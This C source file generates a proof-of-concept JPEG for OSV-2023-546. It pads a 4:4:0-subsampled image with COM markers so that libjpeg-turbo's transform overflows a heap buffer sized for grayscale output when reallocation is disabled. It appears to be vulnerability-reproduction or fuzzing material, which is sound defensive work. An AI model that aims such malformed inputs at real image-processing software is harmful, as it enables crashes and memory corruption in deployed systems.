/*
 * Generate PoC JPEG for OSV-2023-546
 *
 * Creates a small JPEG (16x16) with TJSAMP_440 subsampling and embedded
 * COM markers. The COM markers inflate the transform output beyond the
 * TJSAMP_GRAY worst-case buffer estimate, triggering a heap overflow
 * when the undersized buffer is used with TJFLAG_NOREALLOC.
 *
 * Why 16x16: Small allocations stay in ASAN's slab allocator where
 * heap redzones reliably detect the overflow. Large allocations
 * (>128KB) use mmap, where ASAN's redzone coverage may be insufficient.
 *
 * The generated JPEG is written to "poc.jpg" in the current directory.
 */

#include <turbojpeg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define IMG_W  16
#define IMG_H  16

/* Simple PRNG for deterministic output */
static unsigned int prng_state = 0xDEADBEEF;
static unsigned char prng_byte(void) {
    prng_state = prng_state * 1103515245 + 12345;
    return (unsigned char)((prng_state >> 16) & 0xFF);
}

/*
 * Inject COM markers after the JPEG SOI marker.
 * tjTransform with JCOPYOPT_ALL (when TJXOPT_COPYNONE is not set) copies
 * these markers to the output, inflating it beyond the TJSAMP_GRAY
 * worst-case estimate.
 */
static int inject_com(const unsigned char *src, unsigned long srcLen,
                       unsigned char **out, unsigned long *outLen,
                       unsigned long extraBytes)
{
    unsigned long maxOut = srcLen + extraBytes + 65536;
    *out = (unsigned char *)malloc(maxOut);
    if (!*out) return -1;

    unsigned long opos = 0;
    const unsigned char *p = src;

    /* Copy SOI (FF D8) */
    (*out)[opos++] = *p++;
    (*out)[opos++] = *p++;

    /* Inject COM markers (FF FE) with dummy data */
    unsigned long done = 0;
    int count = 0;
    while (done < extraBytes) {
        unsigned int chunk = 65533;  /* max data per COM segment */
        if (extraBytes - done < chunk)
            chunk = (unsigned int)(extraBytes - done);

        unsigned int segLen = chunk + 2;  /* +2 for length field itself */
        (*out)[opos++] = 0xFF;
        (*out)[opos++] = 0xFE;  /* COM marker */
        (*out)[opos++] = (segLen >> 8) & 0xFF;
        (*out)[opos++] = segLen & 0xFF;

        for (unsigned int i = 0; i < chunk; i++)
            (*out)[opos++] = (unsigned char)(i & 0xFF);

        done += chunk;
        count++;
    }

    /* Copy rest of original JPEG */
    while (p < src + srcLen)
        (*out)[opos++] = *p++;

    *outLen = opos;
    return count;
}

int main(void)
{
    /* Create a small RGB image with pseudo-random content */
    unsigned char pixels[IMG_W * IMG_H * 3];
    for (int i = 0; i < IMG_W * IMG_H * 3; i++)
        pixels[i] = prng_byte();

    tjhandle compressor = tjInitCompress();
    if (!compressor) {
        fprintf(stderr, "[gen_poc] tjInitCompress failed\n");
        return 1;
    }

    unsigned char *jpegBuf = NULL;
    unsigned long jpegSize = 0;

    /* Compress with TJSAMP_440 (4:4:0 subsampling) at quality 100 */
    int ret = tjCompress2(compressor, pixels, IMG_W, 0, IMG_H,
                          TJPF_RGB, &jpegBuf, &jpegSize,
                          TJSAMP_440, 100, 0);
    if (ret != 0) {
        fprintf(stderr, "[gen_poc] tjCompress2 failed: %s\n",
                tjGetErrorStr2(compressor));
        tjDestroy(compressor);
        return 1;
    }

    fprintf(stderr, "[gen_poc] Base JPEG: %dx%d, TJSAMP_440, quality 100, %lu bytes\n",
            IMG_W, IMG_H, jpegSize);

    unsigned long grayBuf = tjBufSize(IMG_W, IMG_H, TJSAMP_GRAY);
    unsigned long fullBuf = tjBufSize(IMG_W, IMG_H, TJSAMP_440);
    fprintf(stderr, "[gen_poc] Buffer sizes: GRAY=%lu, FULL(440)=%lu, deficit=%lu\n",
            grayBuf, fullBuf, fullBuf - grayBuf);

    /* Inject COM markers totaling grayBuf bytes.
     * The base grayscale output is small (~600 bytes for 16x16).
     * Adding grayBuf bytes (~2560) of COM markers ensures the total
     * output exceeds the grayBuf limit. */
    unsigned char *malformed = NULL;
    unsigned long malformedSize = 0;
    int numMarkers = inject_com(jpegBuf, jpegSize, &malformed, &malformedSize,
                                 grayBuf);

    fprintf(stderr, "[gen_poc] Injected %d COM markers (%lu extra bytes)\n",
            numMarkers, grayBuf);
    fprintf(stderr, "[gen_poc] Malformed JPEG: %lu bytes\n", malformedSize);

    /* Write to poc.jpg */
    FILE *f = fopen("poc.jpg", "wb");
    if (!f) {
        perror("[gen_poc] fopen");
        free(malformed);
        tjFree(jpegBuf);
        tjDestroy(compressor);
        return 1;
    }
    fwrite(malformed, 1, malformedSize, f);
    fclose(f);

    fprintf(stderr, "[gen_poc] Written to poc.jpg\n");

    free(malformed);
    tjFree(jpegBuf);
    tjDestroy(compressor);
    return 0;
}
